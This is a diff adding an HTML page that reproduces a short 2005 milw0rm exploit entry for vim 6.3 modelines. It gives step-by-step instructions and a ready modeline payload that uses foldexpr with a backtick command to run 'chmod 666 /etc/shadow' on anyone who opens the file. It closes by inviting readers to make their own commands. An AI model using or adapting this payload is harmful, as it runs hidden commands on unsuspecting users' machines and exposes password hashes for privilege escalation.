@@ -1,0 +1,17 @@
+<html><head><title>vim 6.3 < 6.3.082 (modlines) Local Command Execution Exploit</title></head><pre>1) open up a text file.
+
+2) insert at the top the information (below).
+
+/* vim: foldmethod=expr:foldexpr=glob(&quot;`chmod\ 666\ /etc/shadow`&quot;) */
+
+3) if modlines = on anyone that opens the file with vim will execute the command:
+   chmod 666 /etc/shadow
+   
+Have fun making your own commands.
+
+The advisory can be found at:
+  http://www.guninski.com/where_do_you_want_billg_to_go_today_5.html
+
+/str0ke
+
+# milw0rm.com [2005-07-25]</pre></html>
